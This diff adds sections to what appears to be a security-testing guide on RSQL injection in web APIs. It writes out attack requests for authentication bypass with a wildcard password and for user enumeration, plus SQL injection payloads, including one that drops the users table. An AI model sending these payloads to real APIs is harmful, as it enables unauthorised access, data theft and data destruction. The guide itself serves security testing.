@@ -39,6 +39,32 @@ Or even take advantage to extract sensitive information with Boolean queries or 
 - **Evasion of access controls:** Manipulation of filters to access restricted data.
 - **Impersonation or IDOR:** Modification of identifiers between users through filters that allow access to information and resources of other users without being properly authenticated as such.
 
+## Entry point detection
+RSQL allows building queries through the `q` or `query` parameters. If this parameters is directly concatenated in queries without validation, it is vulnerable.
+#### GET parameters
+```console
+GET /api/v2/users?q=username==admin # User enumeration or data extraction
+GET /api/v2/users?q=username==admin;password==* # Authentication Bypass
+GET /api/v2/users?filter[username]=admin User enumeration or data extraction
+GET /api/v2/users?filter[username]==admin;password==* # Authentication Bypass
+GET /api/v2/users?include=roles,permissions # User enumeration or data extraction
+GET /api/v2/users?include=roles,(select * from users) # Execution of malicious code
+GET /api/v2/users?sort=id;drop table users # Execution of malicious code
+```
+
+#### POST, TRACE or PUT parameters
+```console
+{
+  "query": "username==admin;password==*" # Authentication Bypass
+}
+```
+
+#### HTTP Headers
+Some APIs allow queries to be sent in HTTP headers.
+```console
+<HEADER>: username==admin;password==* # Authentication Bypass
+```
+
 ## Supported RSQL operators
 | Operator  | Description | Example  |
 |:----: |:----: |:------------------:|
@@ -94,6 +120,27 @@ These parameters help optimize API responses:
 | `page[number]` | Specifies the page number | `/api/v2/products?page[number]=2` |
 | `fields[resource]` | Defines which fields to return in the response | `/api/v2/users?fields[users]=id,name,email` |
 | `search` | Performs a more flexible search | `/api/v2/posts?search=technology` |
+
+## Authentication Bypass
+If there is no correct validation, it would be possible to evade it by using the wildcard `*` value as a password or try to guess it through a sequential and asterisk:
+
+#### GET Parameters
+```console
+GET /api/v2/users?q=username==admin;password==* 
+```
+
+#### POST, TRACE or PUT parameters
+```console
+{
+  "query": "username==admin;password==*"
+}
+```
+
+#### HTTP Headers
+Some APIs allow queries to be sent in HTTP headers.
+```console
+<HEADER>: username==admin;password==*
+```
 
 ## Information leakage and enumeration of users
 The following request shows a registration endpoint that requires the email parameter to check if there is any user registered with that email and return a true or false depending on whether or not it exists in the database:
